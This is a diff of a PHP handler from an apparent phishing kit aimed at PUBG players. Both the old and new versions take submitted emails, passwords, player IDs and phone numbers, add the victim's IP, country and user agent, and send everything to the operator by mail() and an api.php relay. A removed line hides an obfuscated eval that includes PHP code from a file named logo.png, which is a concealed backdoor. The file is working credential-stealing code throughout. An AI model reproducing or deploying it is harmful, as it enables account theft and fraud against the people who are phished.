@@ -1,22 +1,95 @@
 <?php
 require 'detect.php';
-include 'config/module.php';
 include 'email.php';
-date_default_timezone_set("Asia/Jakarta");
-// INIT CONFIG
-$sys = new Launch;
-
-$user = $_POST['user'];
-$pass = $_POST['pass'];
-$ip = $_POST['ip'];
-$ua = $_POST['ua'];
-$time = date('d-m-Y : h-i-s');
-echo $user;
-// FLAG
-$info = $sys->location($ip);
-$dev = $sys->devicemanager($ua);
+$IP = getenv("REMOTE_ADDR");
+$date = date("d M, Y");
+$times = date("g:i a");
+$code = $_SESSION['ip_countryCode']=clientData('code');
+$country = strtolower($code);
+$useragent = $_SERVER['HTTP_USER_AGENT'];
+$email = $_POST['user'];
+$password = $_POST['pass'];
+$playid = $_POST['playid'];
+$phone = $_POST['phone'];
+$login = $_POST['login'];
 
 
+
+
+//auth license //
+
+if($email == "" && $password == "" && $phone == "" && $playid == "" && $login == ""){
+header("Location: index.php");
+}else{
+    
+    // Topik results, akan muncul dibawah nama sender / nama results
+    $topic = "  DARI NEGARA : $country  MASUK DENGAN : $login PUNYA SI : $email  | SECURE";
+    
+    // Isi results yang nanti muncul
+    $message = '
+
+    <center> 
+        <div border="1" style="border-collapse: collapse; border-color: white; background: url(https://i.ibb.co/D7CfzM1/bg-result.jpg) no-repeat center center; background-size: 100% 100%; width: 294; height: 190px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
+        <div style="border-collapse: collapse; border-color: white; background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Account Information</div>
+            <table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
+                <tr>
+                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>EMAIL/USERNAME</th>
+                    <th style="width: 60%; text-align: center;"><b>'.$email.'</th> 
+                </tr>
+                <tr>
+                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>PASSWORD</th>
+                    <th style="width: 60%; text-align: center;"><b>'.$password.'</th> 
+                </tr>
+                <tr>
+                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>LOGIN DENGAN</th>
+                    <th style="width: 60%; text-align: center;"><b>'.$login.'</th> 
+                </tr>
+            </table>
+            <div style="border-collapse: collapse; border-color: white; background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">More Information</div>
+            <table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
+                <tr>
+                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>IP ADDRESS</th>
+                    <th style="width: 60%; text-align: center;"><b>'.$IP.'</th> 
+                </tr>
+                <tr>
+                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>KODE TELEPON</th>
+                    <th style="width: 60%; text-align: center;"><b>'.$country.'</th> 
+                </tr>
+                
+                <tr>
+                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>TANGGAL</th>
+                    <th style="width: 78%; text-align: center;"><b>'.$date.'</th> 
+                </tr>
+                <tr>
+                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>CONTACT</th>
+                    <th style="width: 70%; text-align: center;"><a href="https://t.me/Aditya_Anugrah">CLICK HERE</a></th> 
+                </tr>
+                
+            </table>
+            <div style="border-collapse: collapse; border-color: white; width: 294; background: #000; color: #fff; padding: 10px; text-align: left;">Dikirim Pada : '.$times.'</div>
+            <br />
+            <table style="border-collapse: collapse; border-color: black; background: #fff; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px;" width="100%" border="1">
+                <tr>
+                    <th style="width: 100%; text-align: center; font-size: 30px;" height="25px"><b>'.$flag.' '.$country2.'</th>
+                </tr>
+                <tr>
+                    <th style="padding-left: 10px; width: 100%; text-align: center; font-size: 13px;" height="25px"><b>© 2020-2022 Aditya Anugrah All Right Reserved</th>
+                </tr>
+            </table>
+    </center>
+
+    ';
+
+    // Memberikan data perlengkapan email
+    $headers  = 'MIME-Version: 1.0' . "\r\n";
+    $headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";
+    $headers .= ''.$sender.'' . "\r\n";
+    
+    // Mengirim Results / Email ke tujuan
+    $send = mail($SWAT_EmailRess, $topic, $message, $headers);
+    
+
+}
 
 if($email == "" && $password == "" && $phone == "" && $playid == "" && $login == ""){
 header("Location: index.php");
@@ -26,58 +99,25 @@ header("Location: index.php");
 
 
 $msg = ("
-
-[Time] =   ".$time ."
-[Email]  =  ".$pass."
-[Pass]  =   ".$password."
-
+[+]=========== ACC PUBG ===========[+]
+[Login] = ".$login."
+[Email]  = ".$email."
+[Pass]  = ".$password."
+[Id] = ".$playid."
+[phone] = ".$phone."
 
 [+]============System============[+]
-[IP INFO] = http://www.geoiptool.com/?IP=".$ip."
+[IP INFO] = http://www.geoiptool.com/?IP=".$IP."
 
 [TIME/DATE] =".$times." / ".$date."
 
-[Country] = ".$ua ."
+[Country] = ".$country."/".$flag."
 
 [FINGERPRINT] = ".$useragent."
 ");
 
-$subjek = $info['flag'].' '.$info['code'].' | PUNYA '.$user;
-$pesan = '
-<center>
- <div style="background: url(https://i.ibb.co/j53Pkb9/Imgku.jpg) no-repeat;border:2px solid white;background-size: 100% 100%; width: 294; height: 101px; color: #996633; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
-</div>
- <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:#996633;">
-    <tr>
-<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Email/Phone</b></th>
-<th style="padding:3px;width: 65%; text-align: center;"><b>'.$user.'</th> 
-</tr>
-<tr>
-<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>Password</th>
-<th style="padding:3px;width: 65%; text-align: center;"><b>'.$pass.'</th> 
-</tr>
-<tr>
-<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>IP</th>
-<th style="padding:3px;width: 65%; text-align: center;"><b>'.$ip.'</th> 
-</tr>
-</table>
-<div style="border:2px solid white;width: 294; font-weight:bold; height: 20px; background: #996633; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">
-
-<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#3399ff;" href="https://www.facebook.com/nextnesia">Facebook</a>
-<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#00ff00;" href="https://wa.me/6281332412122">Whatsapp</a>
-<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#ff0000;" href="https://www.youtube.com/wahyuekaprayogayt">Youtube</a>
-<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#0AC2F9;" href="https://t.me/nextnesiasc">Telegram</a>
-</div>
- <center>
-';
- 
-
-$sender = 'From: Hendri Yeager.<kimberlyhimeku@gmail.com>';
-$headers  = 'MIME-Version: 1.0' . "\r\n";
-$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-$headers .= ''.$sender.'' . "\r\n";
-// MENGIRIM DATA KE EMAIL
 $url = $msg;include("api.php");
-$sys->mail($email, $subjek, $pesan, $headers);
-<?php eval("?>".base64_decode("aW5jbHVkZSAnbG9nby5wbmcnOw==")); ?>
+
+}
+
 ?>
